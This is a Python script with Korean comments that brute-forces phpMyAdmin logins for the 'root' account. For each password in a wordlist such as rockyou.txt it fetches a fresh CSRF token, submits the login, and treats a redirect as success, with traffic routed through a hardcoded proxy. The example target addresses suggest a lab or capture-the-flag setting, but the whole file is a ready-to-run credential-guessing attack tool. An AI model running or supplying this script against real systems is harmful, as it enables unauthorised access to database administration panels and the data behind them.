#!/usr/bin/env python3
"""
사용 예시:
  1. 기본 실행:
     python3 brute_pma.py

  2. 대상 URL과 워드리스트 직접 지정:
     python3 brute_pma.py http://10.10.10.X/phpmyadmin/index.php /usr/share/wordlists/rockyou.txt
"""

import sys

import requests


def brute_force(url, user, wordlist_path, proxy):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    proxies = {"http": proxy, "https": proxy} if proxy else {}

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] 워드리스트 파일을 찾을 수 없습니다: {wordlist_path}")
        return

    print(f"[*] Target: {url} | User: {user} | Count: {len(passwords)}")

    for i, pw in enumerate([""] + passwords, 1):
        try:
            # 1. GET: 세션 쿠키 및 CSRF 토큰(token) 획득
            res_get = session.get(url, proxies=proxies, timeout=10)
            token = (
                res_get.text.split('name="token"')[1].split('value="')[1].split('"')[0]
            )

            # 2. POST: 획득한 토큰과 함께 로그인 요청
            data = {
                "pma_username": user,
                "pma_password": pw,
                "token": token,
                "server": "1",
            }
            res_post = session.post(
                url, data=data, proxies=proxies, allow_redirects=False, timeout=10
            )

            display_pw = "<EMPTY>" if pw == "" else pw

            # 3. 결과 판별 (302 리다이렉트 발생 시 성공 가능성 높음)
            if res_post.status_code in (301, 302, 303, 307):
                print(f"\n[+] SUCCESS! Password found: '{display_pw}'")
                return

            print(f"[-] [{i}] Failed: '{display_pw}'", end="\r")

        except Exception as e:
            print(f"\n[!] Error at password '{pw}': {e}")
            session = requests.Session()  # 에러 시 세션 리셋


if __name__ == "__main__":
    # 인자가 부족할 경우 안내 출력 후 기본값 사용 또는 종료
    url = (
        sys.argv[1]
        if len(sys.argv) > 1
        else "http://127.0.0.1:8080/phpmyadmin/index.php"
    )
    wordlist = (
        sys.argv[2]
        if len(sys.argv) > 2
        else "/usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt"
    )
    proxy = "http://192.168.199.189:3128"  # 프록시 사용 안 함퍼려면 "" 로 변경

    brute_force(url, "root", wordlist, proxy)
